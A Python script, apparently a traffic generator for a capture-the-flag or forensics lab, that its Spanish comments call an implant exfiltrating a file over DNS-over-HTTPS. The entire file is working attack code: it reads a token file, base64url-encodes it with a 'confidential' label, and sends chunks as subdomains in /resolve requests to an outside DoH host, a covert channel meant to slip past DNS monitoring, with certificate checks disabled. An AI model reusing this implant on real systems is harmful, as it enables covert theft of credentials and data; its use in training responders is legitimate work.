#!/usr/bin/env python3
"""
Implante que exfiltra un fichero por DoH (DNS-over-HTTPS).

Cada consulta GET /resolve?name=<chunk>.exfil.n0rthwind-doh.com lleva un trozo del
dato exfiltrado (base64url) en el subdominio. Como el DNS va DENTRO de HTTPS, un
proxy DNS normal no lo ve — canal encubierto. El TLS usa key exchange RSA, asi que
el IR lo descifra y reconstruye las consultas.
"""
import base64
import os
import socket
import ssl
import time

DOH = os.environ.get("DOH_HOST", "doh-server")
START_DELAY = int(os.environ.get("START_DELAY", "6"))
TOKEN_FILE = os.environ.get("TOKEN_FILE", "/seed/doh_token.txt")
SNI = "dns.n0rthwind-doh.com"
CHUNK = 20


def log(m):
    print(m, flush=True)


def read_token():
    try:
        with open(TOKEN_FILE, "r", encoding="utf-8") as fh:
            return fh.read().strip()
    except OSError:
        return "NORTHWIND{missing_token}"


def main():
    time.sleep(START_DELAY)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.maximum_version = ssl.TLSVersion.TLSv1_2
    ctx.set_ciphers("AES128-SHA:@SECLEVEL=0")
    for _ in range(40):
        try:
            with socket.create_connection((DOH, 443), timeout=3):
                break
        except OSError:
            time.sleep(1)

    token = read_token()
    secret = f"Northwind CONFIDENTIAL export | vpn_token: {token}"
    blob = base64.urlsafe_b64encode(secret.encode("utf-8")).decode("ascii").rstrip("=")
    chunks = [blob[i:i + CHUNK] for i in range(0, len(blob), CHUNK)]
    log(f"[implant] exfiltrando por DoH: {len(chunks)} consultas /resolve hacia {SNI}")
    for i, c in enumerate(chunks):
        try:
            raw = socket.create_connection((DOH, 443), timeout=5)
            s = ctx.wrap_socket(raw, server_hostname=SNI)
            name = f"{c}.s{i:02d}.exfil.n0rthwind-doh.com"
            req = (
                f"GET /resolve?name={name}&type=A HTTP/1.1\r\n"
                f"Host: {SNI}\r\naccept: application/dns-json\r\n\r\n"
            )
            s.sendall(req.encode())
            s.recv(1024)
            s.close()
        except Exception as e:
            log(f"[implant] error: {e}")
        time.sleep(0.4)
    log("[implant] exfiltracion DoH completada.")
    open("/tmp/session_done", "w").close()
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
